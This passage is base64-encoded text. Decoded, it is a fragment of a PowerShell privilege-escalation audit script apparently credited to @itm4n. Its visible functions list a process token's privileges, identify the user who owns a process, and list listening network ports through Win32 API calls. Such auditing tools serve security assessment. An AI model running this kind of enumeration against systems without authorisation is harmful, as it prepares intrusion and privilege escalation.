RyU2l6ZSA9ICRUb2tlblByaXZpbGVnZXNQdHJTaXplIgoKICAgICAgICAgICAgW0ludFB0cl0kVG9rZW5Qcml2aWxlZ2VzUHRyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6QWxsb2NIR2xvYmFsKCRUb2tlblByaXZpbGVnZXNQdHJTaXplKQoKICAgICAgICAgICAgJFN1Y2Nlc3MgPSBbUHJpdmVzY0NoZWNrLldpbjMyXTo6R2V0VG9rZW5JbmZvcm1hdGlvbigkVG9rZW5IYW5kbGUsIDMsICRUb2tlblByaXZpbGVnZXNQdHIsICRUb2tlblByaXZpbGVnZXNQdHJTaXplLCBbcmVmXSRUb2tlblByaXZpbGVnZXNQdHJTaXplKQogICAgICAgICAgICAkTGFzdEVycm9yID0gW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXRMYXN0V2luMzJFcnJvcigpCgogICAgICAgICAgICBpZiAoJFN1Y2Nlc3MpIHsKCiAgICAgICAgICAgICAgICAjIENvbnZlcnQgdGhlIHVubWFuYWdlZCBtZW1vcnkgYXQgb2Zmc2V0ICRUb2tlblByaXZpbGVnZXNQdHIgdG8gYSBUT0tFTl9QUklWSUxFR0VTIG1hbmFnZWQgdHlwZSAKICAgICAgICAgICAgICAgICRUb2tlblByaXZpbGVnZXMgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkVG9rZW5Qcml2aWxlZ2VzUHRyLCBbdHlwZV0gW1ByaXZlc2NDaGVjay5XaW4zMitUT0tFTl9QUklWSUxFR0VTXSkKICAgICAgICAgICAgICAgICRPZmZzZXQgPSBbSW50UHRyXSAoJFRva2VuUHJpdmlsZWdlc1B0ci5Ub0ludDY0KCkgKyA0KQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJHZXRUb2tlbkluZm9ybWF0aW9uKCkgT0sgLSBQcml2aWxlZ2UgY291bnQ6ICQoJFRva2VuUHJpdmlsZWdlcy5Qcml2aWxlZ2VDb3VudCkiCgogICAgICAgICAgICAgICAgRm9yICgkaSA9IDA7ICRpIC1sdCAkVG9rZW5Qcml2aWxlZ2VzLlByaXZpbGVnZUNvdW50OyAkaSsrKSB7CgogICAgICAgICAgICAgICAgICAgICMgQ2FzdCB0aGUgdW5tYW5hZ2VkIG1lbW9yeSBhdCBvZmZzZXQgCiAgICAgICAgICAgICAgICAgICAgJEx1aWRBbmRBdHRyaWJ1dGVzID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJE9mZnNldCwgW3R5cGVdIFtQcml2ZXNjQ2hlY2suV2luMzIrTFVJRF9BTkRfQVRUUklCVVRFU10pCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgIyBDb3B5IExVSUQgdG8gdW5tYW5hZ2VkIG1lbW9yeSAKICAgICAgICAgICAgICAgICAgICAkTHVpZFNpemUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoJEx1aWRBbmRBdHRyaWJ1dGVzLkx1aWQpCiAgICAgICAgICAgICAgICAgICAgW0ludFB0cl0kTHVpZFB0ciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkFsbG9jSEdsb2JhbCgkTHVpZFNpemUpCiAgICAgICAgICAgICAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJEx1aWRBbmRBdHRyaWJ1dGVzLkx1aWQsICRMdWlkUHRyLCAkVHJ1ZSkKCiAgICAgICAgICAgICAgICAgICAgW2ludF0kTGVuZ3RoID0gMAogICAgICAgICAgICAgICAgICAgICRTdWNjZXNzID0gW1ByaXZlc2NDaGVjay5XaW4zMl06Okxvb2t1cFByaXZpbGVnZU5hbWUoJE51bGwsICRMdWlkUHRyLCAkTnVsbCwgW3JlZl0kTGVuZ3RoKQogICAgICAgICAgICAgICAgICAgICRMYXN0RXJyb3IgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldExhc3RXaW4zMkVycm9yKCkKCiAgICAgICAgICAgICAgICAgICAgaWYgKC1ub3QgKCRMZW5ndGggLWVxIDApKSB7CgogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJMb29rdXBQcml2aWxlZ2VOYW1lKCkgT0sgLSBMZW5ndGggPSAkTGVuZ3RoIgoKICAgICAgICAgICAgICAgICAgICAgICAgJE5hbWUgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5TdHJpbmdCdWlsZGVyCiAgICAgICAgICAgICAgICAgICAgICAgICROYW1lLkVuc3VyZUNhcGFjaXR5KCRMZW5ndGggKyAxKSB8T3V0LU51bGwKICAgICAgICAgICAgICAgICAgICAgICAgJFN1Y2Nlc3MgPSBbUHJpdmVzY0NoZWNrLldpbjMyXTo6TG9va3VwUHJpdmlsZWdlTmFtZSgkTnVsbCwgJEx1aWRQdHIsICROYW1lLCBbcmVmXSRMZW5ndGgpCiAgICAgICAgICAgICAgICAgICAgICAgICRMYXN0RXJyb3IgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldExhc3RXaW4zMkVycm9yKCkKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkU3VjY2VzcykgewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRQcml2aWxlZ2VOYW1lID0gJE5hbWUuVG9TdHJpbmcoKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgU0VfUFJJVklMRUdFX0VOQUJMRUQgPSAweDAwMDAwMDAyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUHJpdmlsZWdlRW5hYmxlZCA9ICgkTHVpZEFuZEF0dHJpYnV0ZXMuQXR0cmlidXRlcyAtYmFuZCAyKSAtZXEgMgoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkxvb2t1cFByaXZpbGVnZU5hbWUoKSBPSyAtIE5hbWU6ICRQcml2aWxlZ2VOYW1lIC0gRW5hYmxlZDogJFByaXZpbGVnZUVuYWJsZWQiCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFByaXZpbGVnZU9iamVjdCA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFBTT2JqZWN0IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFByaXZpbGVnZU9iamVjdCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIk5hbWUiIC1WYWx1ZSAkUHJpdmlsZWdlTmFtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFByaXZpbGVnZU9iamVjdCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlN0YXRlIiAtVmFsdWUgJChpZiAoJFByaXZpbGVnZUVuYWJsZWQpIHsgIkVuYWJsZWQiIH0gZWxzZSB7ICJEaXNhYmxlZCIgfSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRQcml2aWxlZ2VPYmplY3QgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJEZXNjcmlwdGlvbiIgLVZhbHVlICQoR2V0LVByaXZpbGVnZURlc2NyaXB0aW9uIC1OYW1lICRQcml2aWxlZ2VOYW1lKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFByaXZpbGVnZU9iamVjdAoKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgKFtDb21wb25lbnRNb2RlbC5XaW4zMkV4Y2VwdGlvbl0gJExhc3RFcnJvcikKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlIChbQ29tcG9uZW50TW9kZWwuV2luMzJFeGNlcHRpb25dICRMYXN0RXJyb3IpCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAjIENsZWFudXAgLSBGcmVlIHVubWFuYWdlZCBtZW1vcnkKICAgICAgICAgICAgICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpGcmVlSEdsb2JhbCgkTHVpZFB0cikKCiAgICAgICAgICAgICAgICAgICAgIyBVcGRhdGUgdGhlIG9mZnNldCB0byBwb2ludCB0byB0aGUgbmV4dCBMVUlEX0FORF9BVFRSSUJVVEVTIHN0cnVjdHVyZSBpbiB0aGUgdW5tYW5hZ2VkIGJ1ZmZlcgogICAgICAgICAgICAgICAgICAgICRPZmZzZXQgPSBbSW50UHRyXSAoJE9mZnNldC5Ub0ludDY0KCkgKyBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoJEx1aWRBbmRBdHRyaWJ1dGVzKSkKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlIChbQ29tcG9uZW50TW9kZWwuV2luMzJFeGNlcHRpb25dICRMYXN0RXJyb3IpCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICMgQ2xlYW51cCAtIEZyZWUgdW5tYW5hZ2VkIG1lbW9yeQogICAgICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpGcmVlSEdsb2JhbCgkVG9rZW5Qcml2aWxlZ2VzUHRyKQoKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlIChbQ29tcG9uZW50TW9kZWwuV2luMzJFeGNlcHRpb25dICRMYXN0RXJyb3IpCiAgICAgICAgfQoKICAgICAgICAjIENsZWFudXAgLSBDbG9zZSBUb2tlbiBoYW5kbGUgCiAgICAgICAgJFN1Y2Nlc3MgPSBbUHJpdmVzY0NoZWNrLldpbjMyXTo6Q2xvc2VIYW5kbGUoJFRva2VuSGFuZGxlKQogICAgICAgICRMYXN0RXJyb3IgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldExhc3RXaW4zMkVycm9yKCkKICAgICAgICBpZiAoJFN1Y2Nlc3MpIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiVG9rZW4gaGFuZGxlIGNsb3NlZCIKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlIChbQ29tcG9uZW50TW9kZWwuV2luMzJFeGNlcHRpb25dICRMYXN0RXJyb3IpCiAgICAgICAgfQoKICAgIH0gZWxzZSB7CiAgICAgICAgV3JpdGUtVmVyYm9zZSAoW0NvbXBvbmVudE1vZGVsLldpbjMyRXhjZXB0aW9uXSAkTGFzdEVycm9yKQogICAgfQp9CgpmdW5jdGlvbiBHZXQtVXNlckZyb21Qcm9jZXNzKCkgewogICAgPCMKICAgIC5TWU5PUFNJUwoKICAgIEhlbHBlciAtIEdldHMgdGhlIHVzZXIgYXNzb2NpYXRlZCB0byBhIGdpdmVuIHByb2Nlc3MKCiAgICBBdXRob3I6IEBpdG00bgogICAgTGljZW5zZTogQlNEIDMtQ2xhdXNlCiAgICAKICAgIC5ERVNDUklQVElPTgoKICAgIEZpcnN0IGl0IGdldHMgYSBoYW5kbGUgdG8gdGhlIHByb2Nlc3MgaWRlbnRpZmllZCBieSB0aGUgZ2l2ZW4gUElELiBUaGVuLCBpdCB1c2VzIHRoaXMgaGFuZGxlIHRvCiAgICBhY2Nlc3MgdGhlIHByb2Nlc3MgdG9rZW4uIEdldFRva2VuSW5mb3JtYXRpb24oKSBpcyB0aGVuIHVzZWQgdG8gcXVlcnkgdGhlIFNJRCBvZiB0aGUgdXNlci4KICAgIEZpbmFsbHkgdGhlIFNJRCBpcyBjb252ZXJ0ZWQgdG8gYSBkb21haW4gbmFtZSwgdXNlciBuYW1lIGFuZCBTSUQgdHlwZS4gQWxsIHRoaXMgaW5mb3JtYXRpb24gaXMKICAgIHJldHVybmVkIGluIGEgY3VzdG9tIFBTIG9iamVjdC4gCiAgICAKICAgIC5QQVJBTUVURVIgUHJvY2Vzc0lkCgogICAgVGhlIFBJRCBvZiB0aGUgdGFyZ2V0IHByb2Nlc3MKICAgIAogICAgLkVYQU1QTEUKCiAgICBQUyBDOlw+IEdldC1Vc2VyRnJvbVByb2Nlc3MgLVByb2Nlc3NJZCA2OTcyCgogICAgRG9tYWluICAgICAgICAgIFVzZXJuYW1lIFR5cGUKICAgIC0tLS0tLSAgICAgICAgICAtLS0tLS0tLSAtLS0tCiAgICBERVNLVE9QLUZFT0hOT00gbGFiLXVzZXIgVXNlcgogICAgCiAgICAjPgogICAgCiAgICBbQ21kbGV0QmluZGluZygpXSBwYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSldCiAgICAgICAgW2ludF0KICAgICAgICAkUHJvY2Vzc0lkCiAgICApCgogICAgZnVuY3Rpb24gR2V0LVNpZFR5cGVOYW1lIHsKICAgICAgICBwYXJhbSgKICAgICAgICAgICAgJFNpZFR5cGUKICAgICAgICApCgogICAgICAgICRTaWRUeXBlRW51bSA9IEB7CiAgICAgICAgICAgICJVc2VyIiA9ICIxIjsKICAgICAgICAgICAgIkdyb3VwIiA9ICIyIjsKICAgICAgICAgICAgIkRvbWFpbiIgPSAiMyI7CiAgICAgICAgICAgICJBbGlhcyIgPSAiNCI7CiAgICAgICAgICAgICJXZWxsS25vd25Hcm91cCIgPSAiNSI7CiAgICAgICAgICAgICJEZWxldGVkQWNjb3VudCIgPSAiNiI7CiAgICAgICAgICAgICJJbnZhbGlkIiA9ICI3IjsKICAgICAgICAgICAgIlVua25vd24iID0gIjgiOwogICAgICAgICAgICAiQ29tcHV0ZXIiID0gIjkiOwogICAgICAgICAgICAiTGFiZWwiID0gIjEwIjsKICAgICAgICAgICAgIkxvZ29uU2Vzc2lvbiIgPSAiMTEiOwogICAgICAgIH0KCiAgICAgICAgJFNpZFR5cGVFbnVtLkdldEVudW1lcmF0b3IoKSB8IEZvckVhY2gtT2JqZWN0IHsgCiAgICAgICAgICAgIGlmICggJF8udmFsdWUgLWVxICRTaWRUeXBlICkgCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRfLm5hbWUKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICAjIFBST0NFU1NfUVVFUllfSU5GT1JNQVRJT04gPSAweDA0MDAKICAgICRBY2Nlc3NGbGFncyA9IDB4MDQwMAogICAgJFByb2Nlc3NIYW5kbGUgPSBbUHJpdmVzY0NoZWNrLldpbjMyXTo6T3BlblByb2Nlc3MoJEFjY2Vzc0ZsYWdzLCAkRmFsc2UsICRQcm9jZXNzSWQpCiAgICAjJExhc3RFcnJvciA9IFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKQoKICAgIGlmICgtbm90ICgkTnVsbCAtZXEgJFByb2Nlc3NIYW5kbGUpKSB7CgogICAgICAgIFdyaXRlLVZlcmJvc2UgIk9wZW5Qcm9jZXNzKCkgT0sgLSBIYW5kbGU6ICRQcm9jZXNzSGFuZGxlIgoKICAgICAgICAkVE9LRU5fUVVFUlk9IDB4MDAwOAogICAgICAgIFtJbnRQdHJdJFRva2VuSGFuZGxlID0gW0ludFB0cl06Olplcm8KICAgICAgICAkU3VjY2VzcyA9IFtQcml2ZXNjQ2hlY2suV2luMzJdOjpPcGVuUHJvY2Vzc1Rva2VuKCRQcm9jZXNzSGFuZGxlLCAkVE9LRU5fUVVFUlksIFtyZWZdJFRva2VuSGFuZGxlKTsKICAgICAgICAjJExhc3RFcnJvciA9IFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKQoKICAgICAgICBpZiAoJFN1Y2Nlc3MpIHsKCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIk9wZW5Qcm9jZXNzVG9rZW4oKSBPSyAtIEhhbmRsZTogJFByb2Nlc3NIYW5kbGUiCgogICAgICAgICAgICAjIFRPS0VOX0lORk9STUFUSU9OX0NMQVNTIC0gMSA9IFRva2VuVXNlcgogICAgICAgICAgICAkVG9rZW5Vc2VyUHRyU2l6ZSA9IDAKICAgICAgICAgICAgJFN1Y2Nlc3MgPSBbUHJpdmVzY0NoZWNrLldpbjMyXTo6R2V0VG9rZW5JbmZvcm1hdGlvbigkVG9rZW5IYW5kbGUsIDEsIDAsICROdWxsLCBbcmVmXSRUb2tlblVzZXJQdHJTaXplKQogICAgICAgICAgICAkTGFzdEVycm9yID0gW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXRMYXN0V2luMzJFcnJvcigpCgogICAgICAgICAgICBpZiAoKCRUb2tlblVzZXJQdHJTaXplIC1ndCAwKSAtYW5kICgkTGFzdEVycm9yIC1lcSAxMjIpKSB7CgogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiR2V0VG9rZW5JbmZvcm1hdGlvbigpIE9LIC0gU2l6ZTogJFRva2VuVXNlclB0clNpemUiCgogICAgICAgICAgICAgICAgW0ludFB0cl0kVG9rZW5Vc2VyUHRyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6QWxsb2NIR2xvYmFsKCRUb2tlblVzZXJQdHJTaXplKQoKICAgICAgICAgICAgICAgICRTdWNjZXNzID0gW1ByaXZlc2NDaGVjay5XaW4zMl06OkdldFRva2VuSW5mb3JtYXRpb24oJFRva2VuSGFuZGxlLCAxLCAkVG9rZW5Vc2VyUHRyLCAkVG9rZW5Vc2VyUHRyU2l6ZSwgW3JlZl0kVG9rZW5Vc2VyUHRyU2l6ZSkKICAgICAgICAgICAgICAgICRMYXN0RXJyb3IgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldExhc3RXaW4zMkVycm9yKCkgCgogICAgICAgICAgICAgICAgaWYgKCRTdWNjZXNzKSB7CgogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkdldFRva2VuSW5mb3JtYXRpb24oKSBPSyIKCiAgICAgICAgICAgICAgICAgICAgIyBDYXN0IHVubWFuYWdlZCBtZW1vcnkgdG8gbWFuYWdlZCBUT0tFTl9VU0VSIHN0cnVjdCAKICAgICAgICAgICAgICAgICAgICAkVG9rZW5Vc2VyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJFRva2VuVXNlclB0ciwgW3R5cGVdIFtQcml2ZXNjQ2hlY2suV2luMzIrVE9LRU5fVVNFUl0pCgogICAgICAgICAgICAgICAgICAgICRTaWRUeXBlID0gMAoKICAgICAgICAgICAgICAgICAgICAkVXNlck5hbWVTaXplID0gMjU2CiAgICAgICAgICAgICAgICAgICAgJFVzZXJOYW1lID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLlRleHQuU3RyaW5nQnVpbGRlcgogICAgICAgICAgICAgICAgICAgICRVc2VyTmFtZS5FbnN1cmVDYXBhY2l0eSgyNTYpIHwgT3V0LU51bGwKCiAgICAgICAgICAgICAgICAgICAgJFVzZXJEb21haW5TaXplID0gMjU2CiAgICAgICAgICAgICAgICAgICAgJFVzZXJEb21haW4gPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5TdHJpbmdCdWlsZGVyCiAgICAgICAgICAgICAgICAgICAgJFVzZXJEb21haW4uRW5zdXJlQ2FwYWNpdHkoMjU2KSB8IE91dC1OdWxsCgogICAgICAgICAgICAgICAgICAgICRTdWNjZXNzID0gW1ByaXZlc2NDaGVjay5XaW4zMl06Okxvb2t1cEFjY291bnRTaWQoJE51bGwsICRUb2tlblVzZXIuVXNlci5TaWQsICRVc2VyTmFtZSwgW3JlZl0kVXNlck5hbWVTaXplLCAkVXNlckRvbWFpbiwgW3JlZl0kVXNlckRvbWFpblNpemUsIFtyZWZdJFNpZFR5cGUpCiAgICAgICAgICAgICAgICAgICAgJExhc3RFcnJvciA9IFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKQoKICAgICAgICAgICAgICAgICAgICBpZiAoJFN1Y2Nlc3MpIHsKCiAgICAgICAgICAgICAgICAgICAgICAgICRVc2VyT2JqZWN0ID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgUFNPYmplY3QgCiAgICAgICAgICAgICAgICAgICAgICAgICRVc2VyT2JqZWN0IHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSAiTm90ZVByb3BlcnR5IiAtTmFtZSAiRG9tYWluIiAtVmFsdWUgJFVzZXJEb21haW4uVG9TdHJpbmcoKQogICAgICAgICAgICAgICAgICAgICAgICAkVXNlck9iamVjdCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlVzZXJuYW1lIiAtVmFsdWUgJFVzZXJOYW1lLlRvU3RyaW5nKCkKICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJPYmplY3QgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlICJOb3RlUHJvcGVydHkiIC1OYW1lICJEaXNwbGF5TmFtZSIgLVZhbHVlICIkKCRVc2VyRG9tYWluLlRvU3RyaW5nKCkpXCQoJFVzZXJOYW1lLlRvU3RyaW5nKCkpIgogICAgICAgICAgICAgICAgICAgICAgICAkVXNlck9iamVjdCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgIk5vdGVQcm9wZXJ0eSIgLU5hbWUgIlR5cGUiIC1WYWx1ZSAkKEdldC1TaWRUeXBlTmFtZSAkU2lkVHlwZSkKICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJPYmplY3QKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiTG9va3VwQWNjb3VudFNpZCgpIGZhaWxlZC4iCiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgKFtDb21wb25lbnRNb2RlbC5XaW4zMkV4Y2VwdGlvbl0gJExhc3RFcnJvcikKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkdldFRva2VuSW5mb3JtYXRpb24oKSBmYWlsZWQuIgogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgKFtDb21wb25lbnRNb2RlbC5XaW4zMkV4Y2VwdGlvbl0gJExhc3RFcnJvcikKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAjIENsZWFudXAgLSBGcmVlIHVubWFuYWdlZCBtZW1vcnkgCiAgICAgICAgICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpGcmVlSEdsb2JhbCgkVG9rZW5Vc2VyUHRyKQogICAgICAgICAgICB9CgogICAgICAgICAgICAjIENsZWFudXAgLSBDbG9zZSB0b2tlbiBoYW5kbGUgCiAgICAgICAgICAgICRTdWNjZXNzID0gW1ByaXZlc2NDaGVjay5XaW4zMl06OkNsb3NlSGFuZGxlKCRUb2tlbkhhbmRsZSkKICAgICAgICAgICAgJExhc3RFcnJvciA9IFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKQogICAgICAgICAgICBpZiAoJFN1Y2Nlc3MpIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlRva2VuIGhhbmRsZSBjbG9zZWQiCiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlIChbQ29tcG9uZW50TW9kZWwuV2luMzJFeGNlcHRpb25dICRMYXN0RXJyb3IpCiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJDYW4ndCBvcGVuIHRva2VuIGZvciBwcm9jZXNzIHdpdGggUElEICRQcm9jZXNzSWQiCiAgICAgICAgfQoKICAgICAgICAjIENsZWFudXAgLSBDbG9zZSBwcm9jZXNzIGhhbmRsZSAKICAgICAgICAkU3VjY2VzcyA9IFtQcml2ZXNjQ2hlY2suV2luMzJdOjpDbG9zZUhhbmRsZSgkUHJvY2Vzc0hhbmRsZSkKICAgICAgICAkTGFzdEVycm9yID0gW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXRMYXN0V2luMzJFcnJvcigpCiAgICAgICAgaWYgKCRTdWNjZXNzKSB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlByb2Nlc3MgaGFuZGxlIGNsb3NlZCIKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlIChbQ29tcG9uZW50TW9kZWwuV2luMzJFeGNlcHRpb25dICRMYXN0RXJyb3IpCiAgICAgICAgfQogICAgfSBlbHNlIHsKICAgICAgICBXcml0ZS1WZXJib3NlICJDYW4ndCBvcGVuIHByb2Nlc3Mgd2l0aCBQSUQgJFByb2Nlc3NJZCIKICAgIH0KfQoKZnVuY3Rpb24gR2V0LU5ldHdvcmtFbmRwb2ludHMgewogICAgPCMKICAgIC5TWU5PUFNJUwoKICAgIEhlbHBlciAtIEdldHMgYSBsaXN0IG9mIGxpc3RlbmluZyBwb3J0cyAoVENQL1VEUCkKCiAgICBBdXRob3I6IEBpdG00bgogICAgTGljZW5zZTogQlNEIDMtQ2xhdXNlCiAgICAKICAgIC5ERVNDUklQVElPTgoKICAgIEl0IHVzZXMgdGhlICdHZXRFeHRlbmRlZFRjcFRhYmxlJyBhbmQgJ0dldEV4dGVuZGVkVWRwVGFibGUnIGZ1bmN0aW9ucyBvZiB0aGUgV2luZG93cyBBUEkgdG8gCiAgICBsaXN0IHRoZSBUQ1AvVURQIGVuZHBvaW50cyBvbiB0aGUgbG9jYWwgbWFjaGluZS4gSXQgaGFuZGxlcyBib3RoIElQdjQgYW5kIElQdjYuIEZvciBlYWNoIAogICAgZW50cnkgaW4gdGhlIHRhYmxlLCBhIGN1c3RvbSBQUyBvYmplY3QgaXMgcmV0dXJuZWQsIGluZGljYXRpbmcgdGhlIElQIHZlcnNpb24gKElQdjQvSVB2NiksCiAgICB0aGUgcHJvdG9jb2wgKFRDUC9VRFApLCB0aGUgbG9jYWwgYWRkcmVzcyAoZS5nLjogIjAuMC4wLjA6NDQ1IiksIHRoZSBzdGF0ZSwgdGhlIFBJRCBvZiB0aGUgCiAgICBhc3NvY2lhdGVkIHByb2Nlc3MgYW5kIHRoZSBuYW1lIG9mIHRoZSBwcm9jZXNzLiBUaGUgbmFtZSBvZiB0aGUgcHJvY2VzcyBpcyByZXRyaWV2ZWQgdGhyb3VnaAogICAgYSBjYWxsIHRvICJHZXQtUHJvY2VzcyAtUElEIDxQSUQ+Ii4KICAgIAogICAgLkVYQU1QTEUKCiAgICBQUyBDOlw+IEdldC1OZXR3b3JrRW5kcG9pbnRzIHwgZnQKICAgIAogICAgSVAgICBQcm90byBMb2NhbEFkZHJlc3MgTG9jYWxQb3J0IEVuZHBvaW50ICAgICAgICAgU3RhdGUgICAgICAgUElEIE5hbWUKICAgIC0tICAgLS0tLS0gLS0tLS0tLS0tLS0tIC0tLS0tLS0tLSAtLS0tLS0tLSAgICAgICAgIC0tLS0tICAgICAgIC0tLSAtLS0tCiAgICBJUHY0IFRDUCAgIDAuMC4wLjAgICAgICAgICAgICAxMzUgMC4wLjAuMDoxMzUgICAgICBMSVNURU5JTkcgIDEyMTYgc3ZjaG9zdAogICAgSVB2NCBUQ1AgICAwLjAuMC4wICAgICAgICAgICAgNDQ1IDAuMC4wLjA6NDQ1ICAgICAgTElTVEVOSU5HICAgICA0IFN5c3RlbQogICAgSVB2NCBUQ1AgICAwLjAuMC4wICAgICAgICAgICA1MDQwIDAuMC4wLjA6NTA0MCAgICAgTElTVEVOSU5HICA4NTgwIHN2Y2hvc3QKICAgIElQdjQgVENQICAgMC4wLjAuMCAgICAgICAgICA0OTY2NCAwLjAuMC4wOjQ5NjY0ICAgIExJU1RFTklORyAgIDk4NCBsc2FzcwogICAgSVB2NCBUQ1AgICAwLjAuMC4wICAgICAgICAgIDQ5NjY1IDAuMC4wLjA6NDk2NjUgICAgTElTVEVOSU5HICAgODkyIHdpbmluaXQKICAgIElQdjQgVENQICAgMC4wLjAuMCAgICAgICAgICA0OTY2NiAwLjAuMC4wOjQ5NjY2ICAgIExJU1RFTklORyAgMTg1MiBzdmNob3N0CiAgICBJUHY0IFRDUCAgIDAuMC4wLjAgICAgICAgICAgNDk